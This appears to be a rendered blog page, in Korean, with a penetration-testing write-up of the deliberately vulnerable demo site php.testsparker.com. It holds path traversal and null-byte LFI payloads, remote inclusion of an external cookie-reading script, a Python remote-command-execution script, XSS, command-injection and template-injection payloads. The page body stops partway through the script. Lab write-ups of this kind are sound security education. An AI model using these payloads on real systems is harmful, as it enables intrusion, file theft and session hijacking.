@@ -1,0 +1,868 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>[ VulnWebs ] - php.testsparker.com - A1mH1gh</title>
+<meta name="description" content="RECON Server: Apache/2.2.8 (Win32) PHP/5.2.6   http://php.testsparker.com/robots.txt  Position Leakage Position Leakage-1 서버의 ‘기본 파일’들이 불필요하게 외부에 공개되어 있어 2차 공격에 참고될 수 있음 http://php.testsparker.com/phpinfo.php    http://php.testsparker.com/.svn/all-wcprops    Position Leakage-2 개발자가 만들어둔 ‘백업 파일’에서 부분 소스코드가 노출되고 있어 2차 공격에 참고될 수 있음 http://php.testsparker.com/process.bak    Path Traversal 웹서버 내 파일을 include하는 페이지가 존재 (LFI) http://php.testsparker.com/process.php?file=Generics/index.nsp  아래 파일을 요청해보았으나 응답x ?file=index.php  사용자 입력값을 검사하여 문자열 끝에 확장자 .nsp가 존재하는 지 검증하고 있는 것으로 보임 &lt;?php		             $file = $_REQUEST[&quot;file&quot;];             if(EndsWith($file,&quot;.nsp&quot;))                 include $_REQUEST[&quot;file&quot;]; ?&gt;   따라서, 입력 문자열(index.php) 끝에 null을 삽입하여(index.php%00.nsp) 우회를 시도 ?file=index.php%00.nsp  정상적으로 파일을 불러왔고, 웹서버 내 hosts파일을 읽기위한 페이로드는 아래와 같음 ?file=../../../../../Windows/System32/drivers/etc/hosts%00.nsp    추가로 다음 php wrapper을 통해서 읽을수도있고 ?file=php://filter/convert.base64-encode|convert.base64-decode/resource=file:///Windows/System32/drivers/etc/hosts%00.nsp  외부 파일을 include시킬수도 있음 ?file=http://xss.rocks/xss.js%00.nsp   RCE LFI 취약점을 통해 RCE까지 가능, 아래는 직접 작성한 파이썬 Attack Script 이며 웹서버에 임의 명령어를 실행시킬수있음 ex) cmd: ipconfig import requests import re  url = &#39;http://php.testsparker.com/process.php?file=php://input%00.nsp&#39; cmd = &#39;ipconfig&#39; #명령어 실행가능 &#39;dir c:\&#39;, &#39;whoami&#39;, ... data = f&#39;&lt;?php system(&quot;{cmd}&quot;); ?&gt;&#39;  r = requests.post(url, data=&#39;&lt;123&gt;&#39;+data+&#39;&lt;/456&gt;&#39;) p = re.compile(&#39;(?&lt;=\&lt;123&gt;)(.*?)(?=&lt;\/456&gt;)&#39;,re.DOTALL) res = &#39;&#39;.join(p.findall(r.text))  print(res)   입력한 명령어가 실행되어 실제 서버의 내부 IP를 반환하고있음 Windows IP Configuration  Ethernet adapter Local Area Connection:    Connection-specific DNS Suffix  . : ec2.internal    IPv4 Address. . . . . . . . . . . : 172.30.0.251    Subnet Mask . . . . . . . . . . . : 255.255.255.0    Default Gateway . . . . . . . . . : 172.30.0.1  Tunnel adapter isatap.ec2.internal:    Media State . . . . . . . . . . . : Media disconnected    Connection-specific DNS Suffix  . : ec2.internal  Tunnel adapter Local Area Connection* 9:    Media State . . . . . . . . . . . : Media disconnected    Connection-specific DNS Suffix  . :    참조: https://book.hacktricks.xyz/pentesting-web/file-inclusion#input  XSS XSS-1 외부 JS 파일을 include하는 페이지가 존재함 http://php.testsparker.com/products.php?pro=url  외부스크립트 주소를 전달하면 ?pro=http://xss.rocks/xss.js    외부 스크립트가 페이지 내에 삽입되어 스크립트 실행   xss.js 파일 내용은 아래와 같음 document.write (&quot;This is remote text via xss.js located at xss.rocks &quot; + document.cookie); alert (&quot;This is remote text via xss.js located at xss.rocks &quot; + document.cookie);   XSS-2 로그인 이후 아래 검색페이지에 접속하면 사용자의 입력값을 고대로 반환해준다 http://php.testsparker.com/auth/xss.php?search=test  아래 스크립트를 전송하면 ?search=&lt;script&gt;alert(document.domain)&lt;/script&gt;   스크립트가 실행됨   XSS-3 http://php.testsparker.com/artist.php?id=test   ?id=&lt;script&gt;alert(document.domain)&lt;/script&gt;    XSS-4 http://aspnet.testinvicti.com/About.aspx?hello=&lt;script&gt;alert(document.domain)&lt;/script&gt;  XSS-5 http://php.testsparker.com/hello.php?hpp=&lt;script&gt;alert(1)&amp;pp=&lt;/script&gt;  XSS-6 http://php.testsparker.com/products.php?pro=&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;   Directory Indexing 임의로 ‘test’ 입력했을 때, 디렉토리 인덱싱을 발견 http://php.testsparker.com/test/    Cleartext Transmission 평문통신(http)를 사용하고 있으며 중요정보(ID/PW)가 평문으로 전송되고 있음(인코딩 및 암호화되지 않음)   Insufficient Session Expiration ‘자리 비움’ 상태에서 1시간이 지나도 세션이 유지되고 있으므로 세션관리가 이루어지고 있지 않음 로그인 직후 모습    1시간 경과 모습   OS Command Execution nslookup 서비스를 지원하는 페이지가 존재 http://php.testsparker.com/nslookup.php    사용자가 입력한 IP에 대한 도메인 정보를 출력해주는 것이 정상 프로세스이나 공격자는 별도의 명령어를 추가로 실행할 수 있다  &amp;&amp; : 파이프라인  %SystemRoot% : C:\Windows  &#39; &amp;&amp; type %SystemRoot%\\win.ini &amp;&amp; &#39;    &amp; ping -n 16 localhost &amp;    ETC Code Injection 자동점검 결과 특정 함수가 처리되는 페이지를 찾았고 http://php.testsparker.com/hello.php?name=  아래 값을 삽입하면 ?name=&#39;;sleep(5);#  슬립함수 5초를 지정한대로 응답시간이 늦춰진것을 볼수있다   Server Side Template Injection 서버 내 ‘템플릿’ 페이지가 존재함 (자동점검 툴을 통해 식별) http://php.testsparker.com/artist.php?id=  아래 값을 전달하면   응답페이지에서 연산이 수행된 결과를 반환하고 있다   이는, 사용자의 입력이 서버 측에서 템플릿 ‘랜더링’ 된다는 뜻이다, 연산이 실행되었으니 어쩌면 코드실행도??   서버 측에서 명령어 ‘whoami’가 실행되어 반환된 모습이다 (SSTI2RCE)   참고: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#twig-php     Done.">
+
+
+  <meta name="author" content="A1mH1gh">
+  
+  <meta property="article:author" content="A1mH1gh">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="A1mH1gh">
+<meta property="og:title" content="[ VulnWebs ] - php.testsparker.com">
+<meta property="og:url" content="http://localhost:4000/vulnwebs_writeup/VulnWebs-php.testsparker.com/">
+
+
+  <meta property="og:description" content="RECON Server: Apache/2.2.8 (Win32) PHP/5.2.6   http://php.testsparker.com/robots.txt  Position Leakage Position Leakage-1 서버의 ‘기본 파일’들이 불필요하게 외부에 공개되어 있어 2차 공격에 참고될 수 있음 http://php.testsparker.com/phpinfo.php    http://php.testsparker.com/.svn/all-wcprops    Position Leakage-2 개발자가 만들어둔 ‘백업 파일’에서 부분 소스코드가 노출되고 있어 2차 공격에 참고될 수 있음 http://php.testsparker.com/process.bak    Path Traversal 웹서버 내 파일을 include하는 페이지가 존재 (LFI) http://php.testsparker.com/process.php?file=Generics/index.nsp  아래 파일을 요청해보았으나 응답x ?file=index.php  사용자 입력값을 검사하여 문자열 끝에 확장자 .nsp가 존재하는 지 검증하고 있는 것으로 보임 &lt;?php		             $file = $_REQUEST[&quot;file&quot;];             if(EndsWith($file,&quot;.nsp&quot;))                 include $_REQUEST[&quot;file&quot;]; ?&gt;   따라서, 입력 문자열(index.php) 끝에 null을 삽입하여(index.php%00.nsp) 우회를 시도 ?file=index.php%00.nsp  정상적으로 파일을 불러왔고, 웹서버 내 hosts파일을 읽기위한 페이로드는 아래와 같음 ?file=../../../../../Windows/System32/drivers/etc/hosts%00.nsp    추가로 다음 php wrapper을 통해서 읽을수도있고 ?file=php://filter/convert.base64-encode|convert.base64-decode/resource=file:///Windows/System32/drivers/etc/hosts%00.nsp  외부 파일을 include시킬수도 있음 ?file=http://xss.rocks/xss.js%00.nsp   RCE LFI 취약점을 통해 RCE까지 가능, 아래는 직접 작성한 파이썬 Attack Script 이며 웹서버에 임의 명령어를 실행시킬수있음 ex) cmd: ipconfig import requests import re  url = &#39;http://php.testsparker.com/process.php?file=php://input%00.nsp&#39; cmd = &#39;ipconfig&#39; #명령어 실행가능 &#39;dir c:\&#39;, &#39;whoami&#39;, ... data = f&#39;&lt;?php system(&quot;{cmd}&quot;); ?&gt;&#39;  r = requests.post(url, data=&#39;&lt;123&gt;&#39;+data+&#39;&lt;/456&gt;&#39;) p = re.compile(&#39;(?&lt;=\&lt;123&gt;)(.*?)(?=&lt;\/456&gt;)&#39;,re.DOTALL) res = &#39;&#39;.join(p.findall(r.text))  print(res)   입력한 명령어가 실행되어 실제 서버의 내부 IP를 반환하고있음 Windows IP Configuration  Ethernet adapter Local Area Connection:    Connection-specific DNS Suffix  . : ec2.internal    IPv4 Address. . . . . . . . . . . : 172.30.0.251    Subnet Mask . . . . . . . . . . . : 255.255.255.0    Default Gateway . . . . . . . . . : 172.30.0.1  Tunnel adapter isatap.ec2.internal:    Media State . . . . . . . . . . . : Media disconnected    Connection-specific DNS Suffix  . : ec2.internal  Tunnel adapter Local Area Connection* 9:    Media State . . . . . . . . . . . : Media disconnected    Connection-specific DNS Suffix  . :    참조: https://book.hacktricks.xyz/pentesting-web/file-inclusion#input  XSS XSS-1 외부 JS 파일을 include하는 페이지가 존재함 http://php.testsparker.com/products.php?pro=url  외부스크립트 주소를 전달하면 ?pro=http://xss.rocks/xss.js    외부 스크립트가 페이지 내에 삽입되어 스크립트 실행   xss.js 파일 내용은 아래와 같음 document.write (&quot;This is remote text via xss.js located at xss.rocks &quot; + document.cookie); alert (&quot;This is remote text via xss.js located at xss.rocks &quot; + document.cookie);   XSS-2 로그인 이후 아래 검색페이지에 접속하면 사용자의 입력값을 고대로 반환해준다 http://php.testsparker.com/auth/xss.php?search=test  아래 스크립트를 전송하면 ?search=&lt;script&gt;alert(document.domain)&lt;/script&gt;   스크립트가 실행됨   XSS-3 http://php.testsparker.com/artist.php?id=test   ?id=&lt;script&gt;alert(document.domain)&lt;/script&gt;    XSS-4 http://aspnet.testinvicti.com/About.aspx?hello=&lt;script&gt;alert(document.domain)&lt;/script&gt;  XSS-5 http://php.testsparker.com/hello.php?hpp=&lt;script&gt;alert(1)&amp;pp=&lt;/script&gt;  XSS-6 http://php.testsparker.com/products.php?pro=&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;   Directory Indexing 임의로 ‘test’ 입력했을 때, 디렉토리 인덱싱을 발견 http://php.testsparker.com/test/    Cleartext Transmission 평문통신(http)를 사용하고 있으며 중요정보(ID/PW)가 평문으로 전송되고 있음(인코딩 및 암호화되지 않음)   Insufficient Session Expiration ‘자리 비움’ 상태에서 1시간이 지나도 세션이 유지되고 있으므로 세션관리가 이루어지고 있지 않음 로그인 직후 모습    1시간 경과 모습   OS Command Execution nslookup 서비스를 지원하는 페이지가 존재 http://php.testsparker.com/nslookup.php    사용자가 입력한 IP에 대한 도메인 정보를 출력해주는 것이 정상 프로세스이나 공격자는 별도의 명령어를 추가로 실행할 수 있다  &amp;&amp; : 파이프라인  %SystemRoot% : C:\Windows  &#39; &amp;&amp; type %SystemRoot%\\win.ini &amp;&amp; &#39;    &amp; ping -n 16 localhost &amp;    ETC Code Injection 자동점검 결과 특정 함수가 처리되는 페이지를 찾았고 http://php.testsparker.com/hello.php?name=  아래 값을 삽입하면 ?name=&#39;;sleep(5);#  슬립함수 5초를 지정한대로 응답시간이 늦춰진것을 볼수있다   Server Side Template Injection 서버 내 ‘템플릿’ 페이지가 존재함 (자동점검 툴을 통해 식별) http://php.testsparker.com/artist.php?id=  아래 값을 전달하면   응답페이지에서 연산이 수행된 결과를 반환하고 있다   이는, 사용자의 입력이 서버 측에서 템플릿 ‘랜더링’ 된다는 뜻이다, 연산이 실행되었으니 어쩌면 코드실행도??   서버 측에서 명령어 ‘whoami’가 실행되어 반환된 모습이다 (SSTI2RCE)   참고: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#twig-php     Done.">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2022-11-29T00:00:00+09:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/vulnwebs_writeup/VulnWebs-php.testsparker.com/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "A1mH1gh",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="A1mH1gh Feed">
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          A1mH1gh
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/categories/HTB_Writeup/">HTB Writeup</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/VulnWebs_Writeup/">VulnWebs Writeup</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="http://localhost:4000/">
+        <img src="/assets/img/bow.png" alt="A1mH1gh" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">A1mH1gh</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>Pentesting Log</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">Republic of Korea</span>
+        </li>
+      
+
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+
+      
+
+      
+        <li>
+          <a href="mailto:A1mH1gh4909@gmail.com" rel="me" class="u-email">
+            <meta itemprop="email" content="A1mH1gh4909@gmail.com" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="[ VulnWebs ] - php.testsparker.com">
+    <meta itemprop="description" content="RECONServer: Apache/2.2.8 (Win32) PHP/5.2.6http://php.testsparker.com/robots.txtPosition LeakagePosition Leakage-1서버의 ‘기본 파일’들이 불필요하게 외부에 공개되어 있어 2차 공격에 참고될 수 있음http://php.testsparker.com/phpinfo.phphttp://php.testsparker.com/.svn/all-wcpropsPosition Leakage-2개발자가 만들어둔 ‘백업 파일’에서 부분 소스코드가 노출되고 있어 2차 공격에 참고될 수 있음http://php.testsparker.com/process.bakPath Traversal웹서버 내 파일을 include하는 페이지가 존재 (LFI)http://php.testsparker.com/process.php?file=Generics/index.nsp아래 파일을 요청해보았으나 응답x?file=index.php사용자 입력값을 검사하여 문자열 끝에 확장자 .nsp가 존재하는 지 검증하고 있는 것으로 보임&lt;?php		            $file = $_REQUEST[&quot;file&quot;];            if(EndsWith($file,&quot;.nsp&quot;))                include $_REQUEST[&quot;file&quot;];?&gt;따라서, 입력 문자열(index.php) 끝에 null을 삽입하여(index.php%00.nsp) 우회를 시도?file=index.php%00.nsp정상적으로 파일을 불러왔고, 웹서버 내 hosts파일을 읽기위한 페이로드는 아래와 같음?file=../../../../../Windows/System32/drivers/etc/hosts%00.nsp추가로 다음 php wrapper을 통해서 읽을수도있고?file=php://filter/convert.base64-encode|convert.base64-decode/resource=file:///Windows/System32/drivers/etc/hosts%00.nsp외부 파일을 include시킬수도 있음?file=http://xss.rocks/xss.js%00.nspRCELFI 취약점을 통해 RCE까지 가능, 아래는 직접 작성한 파이썬 Attack Script 이며 웹서버에 임의 명령어를 실행시킬수있음 ex) cmd: ipconfigimport requestsimport reurl = &#39;http://php.testsparker.com/process.php?file=php://input%00.nsp&#39;cmd = &#39;ipconfig&#39; #명령어 실행가능 &#39;dir c:\&#39;, &#39;whoami&#39;, ...data = f&#39;&lt;?php system(&quot;{cmd}&quot;); ?&gt;&#39;r = requests.post(url, data=&#39;&lt;123&gt;&#39;+data+&#39;&lt;/456&gt;&#39;)p = re.compile(&#39;(?&lt;=\&lt;123&gt;)(.*?)(?=&lt;\/456&gt;)&#39;,re.DOTALL)res = &#39;&#39;.join(p.findall(r.text))print(res)입력한 명령어가 실행되어 실제 서버의 내부 IP를 반환하고있음Windows IP ConfigurationEthernet adapter Local Area Connection:   Connection-specific DNS Suffix  . : ec2.internal   IPv4 Address. . . . . . . . . . . : 172.30.0.251   Subnet Mask . . . . . . . . . . . : 255.255.255.0   Default Gateway . . . . . . . . . : 172.30.0.1Tunnel adapter isatap.ec2.internal:   Media State . . . . . . . . . . . : Media disconnected   Connection-specific DNS Suffix  . : ec2.internalTunnel adapter Local Area Connection* 9:   Media State . . . . . . . . . . . : Media disconnected   Connection-specific DNS Suffix  . : 참조: https://book.hacktricks.xyz/pentesting-web/file-inclusion#inputXSSXSS-1외부 JS 파일을 include하는 페이지가 존재함http://php.testsparker.com/products.php?pro=url외부스크립트 주소를 전달하면?pro=http://xss.rocks/xss.js외부 스크립트가 페이지 내에 삽입되어 스크립트 실행xss.js 파일 내용은 아래와 같음document.write (&quot;This is remote text via xss.js located at xss.rocks &quot; + document.cookie);alert (&quot;This is remote text via xss.js located at xss.rocks &quot; + document.cookie);XSS-2로그인 이후 아래 검색페이지에 접속하면 사용자의 입력값을 고대로 반환해준다http://php.testsparker.com/auth/xss.php?search=test아래 스크립트를 전송하면?search=&lt;script&gt;alert(document.domain)&lt;/script&gt;스크립트가 실행됨XSS-3http://php.testsparker.com/artist.php?id=test?id=&lt;script&gt;alert(document.domain)&lt;/script&gt;XSS-4http://aspnet.testinvicti.com/About.aspx?hello=&lt;script&gt;alert(document.domain)&lt;/script&gt;XSS-5http://php.testsparker.com/hello.php?hpp=&lt;script&gt;alert(1)&amp;pp=&lt;/script&gt;XSS-6http://php.testsparker.com/products.php?pro=&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;Directory Indexing임의로 ‘test’ 입력했을 때, 디렉토리 인덱싱을 발견http://php.testsparker.com/test/Cleartext Transmission평문통신(http)를 사용하고 있으며 중요정보(ID/PW)가 평문으로 전송되고 있음(인코딩 및 암호화되지 않음)Insufficient Session Expiration‘자리 비움’ 상태에서 1시간이 지나도 세션이 유지되고 있으므로 세션관리가 이루어지고 있지 않음로그인 직후 모습 1시간 경과 모습OS Command Executionnslookup 서비스를 지원하는 페이지가 존재http://php.testsparker.com/nslookup.php사용자가 입력한 IP에 대한 도메인 정보를 출력해주는 것이 정상 프로세스이나 공격자는 별도의 명령어를 추가로 실행할 수 있다&amp;&amp; : 파이프라인%SystemRoot% : C:\Windows&#39; &amp;&amp; type %SystemRoot%\\win.ini &amp;&amp; &#39;&amp; ping -n 16 localhost &amp;ETCCode Injection자동점검 결과 특정 함수가 처리되는 페이지를 찾았고http://php.testsparker.com/hello.php?name=아래 값을 삽입하면?name=&#39;;sleep(5);#슬립함수 5초를 지정한대로 응답시간이 늦춰진것을 볼수있다Server Side Template Injection서버 내 ‘템플릿’ 페이지가 존재함 (자동점검 툴을 통해 식별)http://php.testsparker.com/artist.php?id=아래 값을 전달하면응답페이지에서 연산이 수행된 결과를 반환하고 있다이는, 사용자의 입력이 서버 측에서 템플릿 ‘랜더링’ 된다는 뜻이다, 연산이 실행되었으니 어쩌면 코드실행도??서버 측에서 명령어 ‘whoami’가 실행되어 반환된 모습이다 (SSTI2RCE)참고: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#twig-phpDone.">
+    <meta itemprop="datePublished" content="2022-11-29T00:00:00+09:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title p-name" itemprop="headline">
+            <a href="http://localhost:4000/vulnwebs_writeup/VulnWebs-php.testsparker.com/" class="u-url" itemprop="url">[ VulnWebs ] - php.testsparker.com
+</a>
+          </h1>
+          
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content e-content" itemprop="text">
+        
+          <aside class="sidebar__right sticky">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu"><li><a href="#recon">RECON</a></li><li><a href="#position-leakage">Position Leakage</a><ul><li><a href="#position-leakage-1">Position Leakage-1</a></li><li><a href="#position-leakage-2">Position Leakage-2</a></li></ul></li><li><a href="#path-traversal">Path Traversal</a></li><li><a href="#rce">RCE</a></li><li><a href="#xss">XSS</a><ul><li><a href="#xss-1">XSS-1</a></li><li><a href="#xss-2">XSS-2</a></li><li><a href="#xss-3">XSS-3</a></li><li><a href="#xss-4">XSS-4</a></li><li><a href="#xss-5">XSS-5</a></li><li><a href="#xss-6">XSS-6</a></li></ul></li><li><a href="#directory-indexing">Directory Indexing</a></li><li><a href="#cleartext-transmission">Cleartext Transmission</a></li><li><a href="#insufficient-session-expiration">Insufficient Session Expiration</a></li><li><a href="#os-command-execution">OS Command Execution</a></li><li><a href="#etc">ETC</a><ul><li><a href="#code-injection">Code Injection</a></li><li><a href="#server-side-template-injection">Server Side Template Injection</a></li></ul></li></ul>
+
+            </nav>
+          </aside>
+        
+        <p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/205482397-efc20268-cebb-4414-a668-e44cb8b9aa7b.png" alt="image" /></p>
+
+<p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/207833806-d4cf32af-1f14-4fb4-b540-b841c6318bd2.png" alt="image" /></p>
+
+<h2 id="recon">RECON</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Server: Apache/2.2.8 (Win32) PHP/5.2.6
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/205216116-ae05e95b-5c2a-4d3f-90ba-e699bd8ec90f.png" alt="image" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/robots.txt
+</code></pre></div></div>
+<h2 id="position-leakage">Position Leakage</h2>
+<h3 id="position-leakage-1">Position Leakage-1</h3>
+<p>서버의 ‘기본 파일’들이 불필요하게 외부에 공개되어 있어 2차 공격에 참고될 수 있음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/phpinfo.php
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/205564597-85e4ea32-73ae-41d1-9359-367c14830f4c.png" alt="image" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/.svn/all-wcprops
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/207520434-83c318e8-e2f8-4889-98d8-9731d8e1e9c9.png" alt="image" /></p>
+
+<h3 id="position-leakage-2">Position Leakage-2</h3>
+<p>개발자가 만들어둔 ‘백업 파일’에서 부분 소스코드가 노출되고 있어 2차 공격에 참고될 수 있음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/process.bak
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/207520936-0974e1e6-58c6-48db-97e5-272bb63bbf76.png" alt="image" /></p>
+
+<h2 id="path-traversal">Path Traversal</h2>
+<p>웹서버 내 파일을 include하는 페이지가 존재 <strong><em>(LFI)</em></strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://php.testsparker.com/process.php?file=Generics/index.nsp
+</code></pre></div></div>
+<p>아래 파일을 요청해보았으나 응답x</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?file=index.php
+</code></pre></div></div>
+<p>사용자 입력값을 검사하여 문자열 끝에 확장자 <strong><em>.nsp</em></strong>가 존재하는 지 검증하고 있는 것으로 보임</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>		
+            <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"file"</span><span class="p">];</span>
+            <span class="k">if</span><span class="p">(</span><span class="nf">EndsWith</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">".nsp"</span><span class="p">))</span>
+                <span class="k">include</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"file"</span><span class="p">];</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>따라서, 입력 문자열(index.php) 끝에 <strong><em>null</em></strong>을 삽입하여(index.php%00.nsp) 우회를 시도</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?file=index.php%00.nsp
+</code></pre></div></div>
+<p>정상적으로 파일을 불러왔고, 웹서버 내 hosts파일을 읽기위한 페이로드는 아래와 같음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?file=../../../../../Windows/System32/drivers/etc/hosts%00.nsp
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/205557577-ca9ebae1-bc09-4556-ae90-04464df65c64.png" alt="image" /></p>
+
+<p>추가로 다음 php wrapper을 통해서 읽을수도있고</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?file=php://filter/convert.base64-encode|convert.base64-decode/resource=file:///Windows/System32/drivers/etc/hosts%00.nsp
+</code></pre></div></div>
+<p>외부 파일을 include시킬수도 있음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?file=http://xss.rocks/xss.js%00.nsp
+</code></pre></div></div>
+
+<h2 id="rce">RCE</h2>
+<p>LFI 취약점을 통해 RCE까지 가능, 아래는 직접 작성한 파이썬 <strong><em>Attack Script</em></strong> 이며 웹서버에 임의 명령어를 실행시킬수있음 <br />ex) cmd: ipconfig</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">re</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">'http://php.testsparker.com/process.php?file=php://input%00.nsp'</span>
+<span class="n">cmd</span> <span class="o">=</span> <span class="s">'ipconfig'</span> <span class="c1">#명령어 실행가능 'dir c:\', 'whoami', ...
+</span><span class="n">data</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'&lt;?php system("</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s">"); ?&gt;'</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s">'&lt;123&gt;'</span><span class="o">+</span><span class="n">data</span><span class="o">+</span><span class="s">'&lt;/456&gt;'</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nb">compile</span><span class="p">(</span><span class="s">'(?&lt;=\&lt;123&gt;)(.*?)(?=&lt;\/456&gt;)'</span><span class="p">,</span><span class="n">re</span><span class="p">.</span><span class="n">DOTALL</span><span class="p">)</span>
